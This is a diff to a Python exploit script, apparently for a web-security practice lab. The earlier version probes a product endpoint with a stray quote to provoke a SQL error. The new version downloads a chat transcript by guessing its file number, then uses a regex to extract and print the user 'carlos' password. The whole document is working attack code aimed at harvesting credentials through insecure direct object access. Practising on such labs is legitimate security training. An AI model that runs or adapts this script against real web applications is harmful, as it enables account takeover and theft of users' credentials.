@@ -9,14 +9,20 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}
 
 def broken_authentification_exploit(session, url) :
-    exploit_url = url+"/product?productId=1'"
-    r = session.get(exploit_url, verify=False, proxies=proxies)
+    # Displaying the file content carlos' password
+    download_url = url + "/download-transcript/1.txt"
+    r = session.get(download_url, verify=False, proxies=proxies)
     
-    if "Internal Server Error" in r.text :
-        print("The error message occur great!")
-        print(r.text)
+    if r.status_code == 200 :
+        matches = re.search(r"You: Ok so my password is (.*)\. Is that right\?", r.text)
+        if matches :
+            password = matches.group(1)
+            print("(+) Here is carlos password : " + password)
+        else :
+            print("(-) Could not retrieve carlos password.")
+            sys.exit(-1)
     else :
-        print("Failed to exploit the error message!")
+        print("Could not display as the chat content!")
 
 if __name__ == "__main__" :
     try :
